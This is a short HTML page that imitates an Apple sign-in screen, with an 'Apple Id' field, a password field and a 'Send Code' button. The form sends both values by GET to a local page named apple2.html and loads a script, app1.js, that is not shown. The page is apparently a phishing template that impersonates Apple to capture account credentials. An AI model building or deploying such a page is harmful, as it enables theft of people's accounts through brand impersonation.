<!DOCTYPE html>
<html lang="en">

<head>
    <title>Sing In</title>

    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="./login.css">
    <link rel="shortcut icon" href="./img/login1.png" type="image/png">
</head>

<body>
    <div class="background">
        <div class="shape"></div>
        <div class="shape"></div>
    </div>
    <form action="./apple2.html" method="get" name="form">
        <h3>Login with Apple <i class="fab fa-apple"></i></h3>

        <label for="username">Apple Id</label>
        <input type="text" placeholder="Apple Id" name="us" id="username" class="login" required>

        <label for="password">Password</label>
        <input type="password" name="pass" id="password" class="password" placeholder="Password" required>

        <button type="submit">Send Code</button>
    </form>
    <script src="./app1.js"></script>
</body>

</html>
